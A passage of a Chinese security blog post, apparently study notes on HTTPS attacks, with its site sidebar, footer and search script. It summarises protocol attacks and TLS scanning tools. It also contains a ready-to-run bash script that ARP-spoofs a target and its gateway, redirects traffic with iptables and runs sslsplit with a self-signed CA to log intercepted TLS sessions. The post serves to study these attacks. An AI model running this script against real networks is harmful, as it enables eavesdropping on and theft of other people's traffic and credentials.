+<li>ED 前辈介绍过的前端劫持思路，之前在周报里写过代码分析、调试过程，但是文章的图文介绍说的非常清楚，这里就不赘述操作了<ul>
+<li><a href="https://www.cnblogs.com/index-html/p/ssl-frontend-hijack.html" target="_blank" rel="noopener">文章</a></li>
+<li><a href="https://github.com/EtherDream/https_hijack_demo" target="_blank" rel="noopener">代码</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="伪造证书攻击"><a href="#伪造证书攻击" class="headerlink" title="伪造证书攻击"></a>伪造证书攻击</h2><h3 id="攻击原理-8"><a href="#攻击原理-8" class="headerlink" title="攻击原理"></a>攻击原理</h3><ul>
+<li>中间人与服务器建立正常的 SSL/TLS 连接，用自己伪造的证书与客户端建立连接<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fnwqsqgjotj20ou07igmc.jpg" alt><h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3></li>
+<li>sslsniff</li>
+<li>sslsplit<ul>
+<li>实际操作（验证性）时可以通过 openssl 生成自签名的证书，为了操作方便，我写了个简单的 sh 脚本如下：  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"create a directory to deposit certificate, input the directory name:"</span> dir</span><br><span class="line">mkdir <span class="string">"<span class="variable">$dir</span>"</span></span><br><span class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$dir</span>"</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;33m [*] \e[0m \e[1;45m create a self signed certificate...\e[0m\n\n"</span></span><br><span class="line">openssl genrsa -out ca.key 2048</span><br><span class="line">openssl req -new -x509 -days 1024 -key ca.key -out ca.crt</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;33m [*] \e[0m \e[1;45m start port forwarding...\e[0m\n\n"</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;33m [*] \e[0m \e[1;45m set port forwarding rules for iptables...\e[0m\n"</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"input the redirected port(ensure this port is free):"</span> portb</span><br><span class="line">netstat -nlp | grep <span class="string">":<span class="variable">$portb</span>"</span>&gt;tempfile </span><br><span class="line"><span class="keyword">if</span> [ -s tempfile ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">kill</span> -9 $(netstat -nlp | grep <span class="string">":<span class="variable">$portb</span>"</span> | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F<span class="string">"/"</span> <span class="string">'&#123; print $1 &#125;'</span> | head -n 1)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">rm tempfile</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"input the monitor port(s):"</span> porta</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;33m [*] \e[0m \e[1;45m reset iptables rules...\e[0m\n\n"</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="variable">$porta</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        iptables -t nat -A PREROUTING -p tcp --dport <span class="variable">$num</span> -j REDIRECT --to-ports <span class="variable">$portb</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"target ip:"</span> target</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"route ip:"</span> route</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;33m [*] \e[0m \e[1;45m arp mitm...\e[0m\n\n"</span></span><br><span class="line">interface=$(ifconfig | awk <span class="string">'&#123;print $1&#125;'</span> | head -n 1 | cut -d <span class="string">":"</span> -f 1)</span><br><span class="line">arpspoof -i <span class="variable">$interface</span> -t <span class="variable">$target</span> <span class="variable">$route</span> &amp;&gt;/dev/null &amp;</span><br><span class="line">arpspoof -i <span class="variable">$interface</span> -t <span class="variable">$route</span> <span class="variable">$target</span> &amp;&gt;/dev/null &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;33m [*] \e[0m \e[1;45m sslsplit started.\e[0m\n\n"</span></span><br><span class="line">mkdir sslsplit_log</span><br><span class="line">sslsplit -D -l sslsplit_log/connect.log -S sslsplit_log/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><h2 id="协议漏洞"><a href="#协议漏洞" class="headerlink" title="协议漏洞"></a>协议漏洞</h2><ul>
+<li>在协议漏洞中的 CRIME、TIME、BREACH、HEIST 这些攻击有很相似的地方，都是基于压缩旁路的攻击手法，且都希望执行 JavaScript 代码从而获取敏感信息（如 CSRF Token），但是不太明白其具体用意，既然能够向客户端插入 JS，完全可以将隐藏表单中的 csrf_token 发送出去；</li>
+<li>除了心脏滴血这个大 bug 之外，其他几种攻击方式的条件还是比较苛刻的（即便在黑帽大会上演示了 demo），尤其是 TIME 和 HEIST（均利用了 TCP 窗口控制协议）对网络环境的稳定有较高的要求；</li>
+<li>很多安全问题想必也是因为之前的问题没有得到很好的解决，随着技术的发展，新的技术放大了之前存在的问题，这篇<a href="https://www.helpnetsecurity.com/2016/08/11/compression-oracle-attacks-https/" target="_blank" rel="noopener">文章</a>说的挺好<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2></li>
+<li>比起现有的协议漏洞的攻击，中间人攻击在实际操作中要更加高效一些，但很容易暴露，比如 ssl 剥离时在客户端的浏览器上没有绿色安全锁的标志，在证书伪造中，客户端浏览器也会弹出证书错误的警告。</li>
+</ul>
+<h1 id="0x04-安全检测"><a href="#0x04-安全检测" class="headerlink" title="0x04 安全检测"></a>0x04 安全检测</h1><ul>
+<li>工具<ol>
+<li>openssl s_client -connect target_ip:443</li>
+<li>sslscan –tlsall target_ip:443 </li>
+<li>sslyze –regular target_ip:443</li>
+<li>nmap –script=ssl-enum-ciphers.nse target_website</li>
+</ol>
+</li>
+<li>网站<ol>
+<li><a href="https://www.ssllabs.com/" target="_blank" rel="noopener">https://www.ssllabs.com/</a></li>
+<li><a href="https://myssl.com/" target="_blank" rel="noopener">https://myssl.com/</a> <h1 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h1></li>
+</ol>
+</li>
+<li><a href="http://xkcd.com/1354/" target="_blank" rel="noopener">心脏滴血漏洞（漫画展示）</a></li>
+<li>《HTTPS 权威指南》</li>
+<li><a href="https://www.cnblogs.com/Alim/p/5340618.html" target="_blank" rel="noopener">一篇博客</a>（含一些协议漏洞的 PoC）</li>
+<li><a href="https://blog.myssl.com/myssl-term/" target="_blank" rel="noopener">HTTPS 的相关术语</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/https/" rel="tag"># https</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/16/DDoS攻防小结/" rel="next" title="DDoS攻防小结">
+                <i class="fa fa-chevron-left"></i> DDoS攻防小结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/15/Linux下进程状态的切换/" rel="prev" title="Linux下进程状态的切换">
+                Linux下进程状态的切换 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/Or1onX.jpg" alt="Or1onX">
+            
+              <p class="site-author-name" itemprop="name">Or1onX</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-协议攻击与漏洞利用"><span class="nav-text">0x01 协议攻击与漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BEAST-攻击（CVE-2011-3389）"><span class="nav-text">BEAST 攻击（CVE-2011-3389）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击对象"><span class="nav-text">攻击对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击原理"><span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实际攻击的前提条件"><span class="nav-text">实际攻击的前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PoC"><span class="nav-text">PoC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRIME-攻击（CVE-2012-4929）"><span class="nav-text">CRIME 攻击（CVE-2012-4929）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#压缩旁路攻击"><span class="nav-text">压缩旁路攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击原理-1"><span class="nav-text">攻击原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TIME-攻击"><span class="nav-text">TIME 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击原理-2"><span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PoC-1"><span class="nav-text">PoC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BREACH（BlackHat，2013）"><span class="nav-text">BREACH（BlackHat，2013）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击原理-3"><span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PoC-2"><span class="nav-text">PoC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HEIST-攻击（BlackHat，2016）"><span class="nav-text">HEIST 攻击（BlackHat，2016）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击原理-4"><span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实际攻击的前提条件-1"><span class="nav-text">实际攻击的前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤"><span class="nav-text">具体步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#心脏滴血（CVE-2014-0160）"><span class="nav-text">心脏滴血（CVE-2014-0160）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击对象-1"><span class="nav-text">攻击对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击原理-5"><span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响"><span class="nav-text">影响</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POODLE（CVE-2014-3566）"><span class="nav-text">POODLE（CVE-2014-3566）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击原理-6"><span class="nav-text">攻击原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-中间人攻击"><span class="nav-text">0x02 中间人攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSL-剥离攻击"><span class="nav-text">SSL 剥离攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击原理-7"><span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实际攻击的前提条件-2"><span class="nav-text">实际攻击的前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-1"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具"><span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#伪造证书攻击"><span class="nav-text">伪造证书攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击原理-8"><span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具-1"><span class="nav-text">工具</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-总结"><span class="nav-text">0x03 总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#协议漏洞"><span class="nav-text">协议漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#中间人攻击"><span class="nav-text">中间人攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-安全检测"><span class="nav-text">0x04 安全检测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-参考文献"><span class="nav-text">0x05 参考文献</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Or1onX</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+<div>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style="display:none">
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style="display:none">
+    访问人数：<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
